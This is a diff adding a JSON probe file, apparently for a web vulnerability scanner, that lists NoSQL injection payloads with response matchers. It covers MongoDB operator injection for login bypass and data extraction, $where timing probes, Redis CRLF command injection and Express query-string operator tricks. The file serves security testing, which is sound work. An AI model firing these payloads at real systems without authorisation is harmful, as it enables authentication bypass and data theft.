@@ -1,0 +1,174 @@
+{
+  "category": "nosql",
+  "contexts": {
+    "mongodb": {
+      "description": "MongoDB NoSQL injection \u2014 operator injection for authentication bypass and data extraction",
+      "tech_match": ["MongoDB", "Express", "Node.js", "Mongoose", "MEAN"],
+      "param_match": ["username", "password", "email", "login", "user", "filter", "search", "query", "id", "name"],
+      "probes": [
+        {
+          "payload": "{\"$ne\":\"\"}",
+          "description": "MongoDB $ne operator injection \u2014 matches all documents where field is not empty; response size increase from baseline indicates auth bypass or data leakage",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "word_count_diff", "min_diff": 5}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$gt\":\"\"}",
+          "description": "MongoDB $gt operator injection \u2014 matches documents with field greater than empty string; differential response confirms injection",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "word_count_diff", "min_diff": 5}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$regex\":\".*\"}",
+          "description": "MongoDB $regex wildcard \u2014 matches all documents; response size increase from baseline indicates injection and data extraction",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "word_count_diff", "min_diff": 5}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$regex\":\"^a\"}",
+          "description": "MongoDB $regex prefix probe \u2014 narrower match than wildcard; compare response size with $regex '.*' to confirm controllable query",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 10}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$where\":\"sleep(5000)\"}",
+          "description": "MongoDB $where time-based blind injection \u2014 server-side JavaScript execution via sleep confirms injection point",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$where\":\"this.a==this.a\"}",
+          "description": "MongoDB $where boolean true \u2014 always-true condition; compare with always-false to confirm $where evaluation",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 0}
+          ],
+          "severity": "medium",
+          "confidence_boost": 25,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$where\":\"this.a!=this.a\"}",
+          "description": "MongoDB $where boolean false \u2014 always-false condition; length diff from true condition confirms $where injection",
+          "matchers": [
+            {"type": "word_count_diff", "min_diff": 3}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
+    },
+    "redis": {
+      "description": "Redis command injection \u2014 CRLF-based command injection when user input is concatenated into Redis protocol",
+      "tech_match": ["Redis", "Node.js", "Python", "PHP"],
+      "param_match": ["key", "cache", "id", "session", "token", "name", "value"],
+      "probes": [
+        {
+          "payload": "test\r\nPING\r\n",
+          "description": "Redis CRLF command injection \u2014 PONG in response confirms Redis command was executed via CRLF injection",
+          "matchers": [
+            {"type": "word", "words": ["PONG", "+PONG"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "test\r\nINFO\r\n",
+          "description": "Redis INFO command injection \u2014 redis_version or connected_clients confirms Redis command execution",
+          "matchers": [
+            {"type": "word", "words": ["redis_version", "connected_clients", "used_memory"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "test\r\nDBSIZE\r\n",
+          "description": "Redis DBSIZE command injection \u2014 integer response confirms Redis access; non-destructive enumeration probe",
+          "matchers": [
+            {"type": "regex", "pattern": ":\\d+"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "detection": {
+      "description": "Generic NoSQL injection detection \u2014 probes that work across MongoDB, CouchDB, and other NoSQL databases",
+      "tech_match": ["MongoDB", "CouchDB", "Express", "Node.js"],
+      "param_match": ["username", "password", "email", "login", "user", "filter", "search", "query", "id"],
+      "probes": [
+        {
+          "payload": "[$ne]=",
+          "description": "Query string operator injection \u2014 Express/qs parses param[$ne]= as {$ne:''} enabling operator injection via GET parameters",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "word_count_diff", "min_diff": 3}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "[$gt]=",
+          "description": "Query string $gt operator injection \u2014 same Express/qs parsing trick with greater-than operator",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "word_count_diff", "min_diff": 3}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$exists\":true}",
+          "description": "MongoDB $exists operator \u2014 matches all documents with the field present; response size increase confirms operator processing",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 30},
+            {"type": "word_count_diff", "min_diff": 3}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}'\"\\;{}",
+          "description": "NoSQL syntax breaker \u2014 special characters that break NoSQL query syntax; 500 error or MongoDB error message confirms injection surface",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["MongoError", "SyntaxError", "JsonParseException", "Unexpected token"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
